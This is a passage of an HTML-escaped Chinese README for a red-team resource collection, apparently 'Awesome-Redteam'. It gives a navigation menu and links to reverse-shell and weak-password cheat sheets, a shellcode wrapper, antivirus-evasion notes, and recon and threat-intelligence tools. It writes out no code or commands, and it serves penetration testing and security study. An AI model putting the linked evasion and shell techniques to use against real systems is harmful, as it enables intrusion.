href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%85%B6%E4%BB%96&#34;&gt;其他&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&#34;&gt;信息收集&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#ip%E5%9F%9F%E5%90%8D&#34;&gt;IP/域名&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%A1%AE%E8%AE%A4%E7%9C%9F%E5%AE%9Eip%E5%9C%B0%E5%9D%80&#34;&gt;确认真实IP地址&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A4%9A%E4%B8%AA%E5%9C%B0%E7%82%B9ping%E6%9C%8D%E5%8A%A1%E5%99%A8&#34;&gt;多个地点Ping服务器&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#whois%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF%E5%8F%8D%E6%9F%A5&#34;&gt;Whois注册信息反查&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#dns%E6%95%B0%E6%8D%AE%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2&#34;&gt;DNS数据聚合查询&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#tls%E8%AF%81%E4%B9%A6%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2&#34;&gt;TLS证书信息查询&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#ip%E5%9C%B0%E5%9D%80%E6%AE%B5%E6%94%B6%E9%9B%86&#34;&gt;IP地址段收集&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB&#34;&gt;指纹识别&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%89%AB%E6%8F%8F%E7%88%86%E7%A0%B4&#34;&gt;扫描/爆破&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%88%86%E7%A0%B4%E5%AD%97%E5%85%B8&#34;&gt;爆破字典&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2&#34;&gt;信息泄露&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1&#34;&gt;电子邮箱&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%BB%BC%E5%90%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&#34;&gt;综合信息收集&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&#34;&gt;内网信息收集&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6&#34;&gt;漏洞研究&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#src&#34;&gt;SRC&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%BC%80%E6%BA%90%E6%96%87%E5%BA%93&#34;&gt;开源文库&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E9%9D%B6%E6%9C%BA%E5%B9%B3%E5%8F%B0&#34;&gt;靶机平台&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8&#34;&gt;漏洞利用&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#dnslog&#34;&gt;DNSlog&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#bypass&#34;&gt;Bypass&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&#34;&gt;内网渗透&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#payloads&#34;&gt;Payloads&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#webshell&#34;&gt;WebShell&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#bypass-1&#34;&gt;Bypass&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%85%8D%E6%9D%80&#34;&gt;免杀&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F&#34;&gt;内网穿透&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%BC%80%E6%BA%90%E8%9C%9C%E7%BD%90&#34;&gt;开源蜜罐&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8&#34;&gt;容器安全&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%85%B6%E4%BB%96-1&#34;&gt;其他&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%96%B0%E4%B8%80%E4%BB%A3%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF&#34;&gt;新一代信息技术&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%89%A9%E8%81%94%E7%BD%91&#34;&gt;移动端/物联网&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%BA%91%E6%9C%8D%E5%8A%A1&#34;&gt;云服务&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A4%A7%E6%95%B0%E6%8D%AE&#34;&gt;大数据&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90&#34;&gt;逆向分析&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#ctf&#34;&gt;CTF&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#ctf%E5%B9%B3%E5%8F%B0&#34;&gt;CTF平台&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%B7%A5%E5%85%B7%E8%B5%8B%E8%83%BD&#34;&gt;工具赋能&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#metasploit&#34;&gt;Metasploit&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#cobaltstrike&#34;&gt;Cobaltstrike&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#burpsuite&#34;&gt;Burpsuite&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#chrome-crx&#34;&gt;Chrome crx&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#xray&#34;&gt;Xray&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#zsh&#34;&gt;Zsh&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF&#34;&gt;使用姿势&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A6%82%E4%BD%95%E5%9C%A8windows%E4%B8%8A%E4%BD%BF%E7%94%A8alias&#34;&gt;如何在Windows上使用alias&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BF%AB%E9%80%9F%E6%9F%A5%E7%9C%8Bmarkdown%E6%96%87%E6%A1%A3&#34;&gt;如何使用浏览器快速查看markdown文档&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;漏洞知识库&lt;/h2&gt; &#xA;&lt;p&gt;Vulnerability Wiki，一个基于docsify开发的漏洞知识库项目，集成了Vulhub、Peiqi、Edge、0sec、Wooyun等开源漏洞库。&lt;/p&gt; &#xA;&lt;p&gt;可以通过docsify自定义部署，也可以通过docker-compose快速部署。&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Vulnerability Wiki：&lt;a href=&#34;https://github.com/Threekiii/Vulnerability-Wiki&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205131146422.png&#34; alt=&#34;image-20220513114641254&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;项目导航&lt;/h2&gt; &#xA;&lt;h3&gt;速查文档-CheatSheets&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;攻防渗透常用命令速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;反弹shell命令速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;重要端口及服务速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E9%87%8D%E8%A6%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;HTTP状态码速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/HTTP%E7%8A%B6%E6%80%81%E7%A0%81%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;安全厂商及官网链接速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E5%AE%89%E5%85%A8%E5%8E%82%E5%95%86%E5%8F%8A%E5%AE%98%E7%BD%91%E9%93%BE%E6%8E%A5%E9%80%9F%E6%9F%A5.txt&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;主要安全产品及弱口令速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E4%B8%BB%E8%A6%81%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E5%8F%8A%E5%BC%B1%E5%8F%A3%E4%BB%A4%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Apache项目及漏洞指纹速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/Apache%E9%A1%B9%E7%9B%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%8C%87%E7%BA%B9%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;OWASP TOP10 2017/2021：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/OWASP%20TOP10.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;一些代码-Scripts&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ShellcodeWrapper：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/ShellcodeWrapper&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;AntivirusScanner：杀软进程检测脚本 &lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;攻防知识-Tips&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;内网渗透-免杀：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;红队中易被攻击的一些重点系统漏洞整理（来源：棱角安全团队）：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E7%BA%A2%E9%98%9F%E4%B8%AD%E6%98%93%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E4%BA%9B%E9%87%8D%E7%82%B9%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;网络攻击与防御图谱：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%9B%BE%E8%B0%B1.svg&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;服务搭建-Docs&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DNS log平台搭建：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/docs/DNS%20log%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;开源导航&lt;/h2&gt; &#xA;&lt;h3&gt;编解码/加解密&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CyberChef：编解码及加密，可本地部署 &lt;a href=&#34;https://github.com/gchq/CyberChef&#34;&gt;https://github.com/gchq/CyberChef&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;OK Tools在线工具：&lt;a href=&#34;https://github.com/wangyiwy/oktools&#34;&gt;https://github.com/wangyiwy/oktools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CTF在线工具：&lt;a href=&#34;http://www.hiencode.com/&#34;&gt;http://www.hiencode.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Unicode字符表：&lt;a href=&#34;https://www.52unicode.com/enclosed-alphanumerics-zifu&#34;&gt;https://www.52unicode.com/enclosed-alphanumerics-zifu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在线MD5 Hash破解：&lt;a href=&#34;https://www.somd5.com/&#34;&gt;https://www.somd5.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;XSSEE：在线综合编解码工具 &lt;a href=&#34;https://evilcos.me/lab/xssee/&#34;&gt;https://evilcos.me/lab/xssee/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;实用工具&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Explain Shell：Shell命令解析 &lt;a href=&#34;https://explainshell.com/&#34;&gt;https://explainshell.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在线正则表达式：&lt;a href=&#34;https://c.runoob.com/front-end/854/&#34;&gt;https://c.runoob.com/front-end/854/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Webshell Chop：&lt;a href=&#34;https://webshellchop.chaitin.cn/demo/&#34;&gt;https://webshellchop.chaitin.cn/demo/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;XSS Chop：&lt;a href=&#34;https://xsschop.chaitin.cn/demo/&#34;&gt;https://xsschop.chaitin.cn/demo/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;WebShell查杀：&lt;a href=&#34;https://n.shellpub.com/&#34;&gt;https://n.shellpub.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;HTML5 Security Cheatsheet：XSS攻击向量学习/参考 &lt;a href=&#34;https://html5sec.org/&#34;&gt;https://html5sec.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在线代码格式标准化：&lt;a href=&#34;http://web.chacuo.net/formatsh&#34;&gt;http://web.chacuo.net/formatsh&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;威胁情报&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Virustotal：&lt;a href=&#34;https://www.virustotal.com/gui/home/upload&#34;&gt;https://www.virustotal.com/gui/home/upload&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;腾讯哈勃分析系统：&lt;a href=&#34;https://habo.qq.com/tool/index&#34;&gt;https://habo.qq.com/tool/index&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;微步在线威胁情报：&lt;a href=&#34;https://x.threatbook.cn/&#34;&gt;https://x.threatbook.cn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;奇安信威胁情报：&lt;a href=&#34;https://ti.qianxin.com/&#34;&gt;https://ti.qianxin.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;360威胁情报：&lt;a href=&#34;https://ti.360.net/#/homepage&#34;&gt;https://ti.360.net/#/homepage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;安恒威胁情报：&lt;a href=&#34;https://ti.dbappsecurity.com.cn/&#34;&gt;https://ti.dbappsecurity.com.cn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;火线安全平台：&lt;a href=&#34;https://www.huoxian.cn&#34;&gt;https://www.huoxian.cn&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;知道创宇漏洞平台：&lt;a href=&#34;https://www.seebug.org/&#34;&gt;https://www.seebug.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hacking8安全信息流：&lt;a href=&#34;https://i.hacking8.com/&#34;&gt;https://i.hacking8.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;网络空间搜索&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fofa：&lt;a href=&#34;https://fofa.info/&#34;&gt;https://fofa.info/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Shodan：&lt;a href=&#34;https://www.shodan.io/&#34;&gt;https://www.shodan.io/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ZoomEye：&lt;a href=&#34;https://www.zoomeye.org/&#34;&gt;https://www.zoomeye.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;谛听：&lt;a href=&#34;https://www.ditecting.com/&#34;&gt;https://www.ditecting.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;360网络空间测绘：&lt;a href=&#34;https://quake.360.cn/quake/#/index&#34;&gt;https://quake.360.cn/quake/#/index&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Google Hacking Database：&lt;a href=&#34;https://www.exploit-db.com/google-hacking-database&#34;&gt;https://www.exploit-db.com/google-hacking-database&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;公开知识库&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;零组文库：零组已停运，非官方 &lt;a href=&#34;https://0-wiki.com/&#34;&gt;https://0-wiki.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;先知社区：&lt;a href=&#34;https://xz.aliyun.com/&#34;&gt;https://xz.aliyun.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;狼组公开知识库：&lt;a href=&#34;https://wiki.wgpsec.org/&#34;&gt;https://wiki.wgpsec.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;404星链计划：知道创宇 404 实验室 &lt;a href=&#34;https://github.com/knownsec/404StarLink&#34;&gt;https://github.com/knownsec/404StarLink&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MITRE ATT＆CK：网络攻击中使用的已知对抗战术和技术 &lt;a href=&#34;https://attack.mitre.org/matrices/enterprise/&#34;&gt;https://attack.mitre.org/matrices/enterprise/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;其他&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Wayback Machine：网页历史缓存 &lt;a href=&#34;https://archive.org/web&#34;&gt;https://archive.org/web&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;信息收集&lt;/h2&gt; &#xA;&lt;h3&gt;IP/域名&lt;/h3&gt; &#xA;&lt;h4&gt;确认真实IP地址&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;IP精准定位：&lt;a href=&#34;https://www.ipuu.net/#/home&#34;&gt;https://www.ipuu.net/#/home&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;IP 138：&lt;a href=&#34;https://site.ip138.com/&#34;&gt;https://site.ip138.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Security Trails：&lt;a href=&#34;https://securitytrails.com/&#34;&gt;https://securitytrails.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;多个地点Ping服务器&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Chinaz：&lt;a href=&#34;https://ping.chinaz.com/&#34;&gt;https://ping.chinaz.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Host Tracker：&lt;a href=&#34;https://www.host-tracker.com/&#34;&gt;https://www.host-tracker.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Webpage Test：&lt;a href=&#34;https://www.webpagetest.org/&#34;&gt;https://www.webpagetest.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DNS Check：&lt;a href=&#34;https://dnscheck.pingdom.com/&#34;&gt;https://dnscheck.pingdom.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Whois注册信息反查&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;站长之家 Whois：&lt;a href=&#34;https://whois.chinaz.com/&#34;&gt;https://whois.chinaz.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;中国万网 Whois：&lt;a href=&#34;https://whois.aliyun.com/&#34;&gt;https://whois.aliyun.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;国际 Whois：&lt;a href=&#34;https://who.is/&#34;&gt;https://who.is/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;DNS数据聚合查询&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hacker Target：&lt;a href=&#34;https://hackertarget.com/find-dns-host-records&#34;&gt;https://hackertarget.com/find-dns-host-records&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DNS Dumpster：&lt;a href=&#34;https://dnsdumpster.com&#34;&gt;https://dnsdumpster.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DNS DB：&lt;a href=&#34;https://dnsdb.io/zh-cn&#34;&gt;https://dnsdb.io/zh-cn&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;TLS证书信息查询&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Censys：&lt;a href=&#34;https://censys.io&#34;&gt;https://censys.io&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Certificate Search：&lt;a href=&#34;https://crt.sh&#34;&gt;https://crt.sh&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;证书透明度监控：&lt;a href=&#34;https://developers.facebook.com/tools/ct&#34;&gt;https://developers.facebook.com/tools/ct&lt;/a&gt;&#34;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;IP地址段收集&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CNNIC中国互联网信息中心：&lt;a href=&#34;http://ipwhois.cnnic.net.cn&#34;&gt;http://ipwhois.cnnic.net.cn&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;指纹识别&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Wapplyzer：Chrome插件 跨平台网站分析工具 &lt;a href=&#34;https://github.com/AliasIO/Wappalyzer&#34;&gt;https://github.com/AliasIO/Wappalyzer&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; 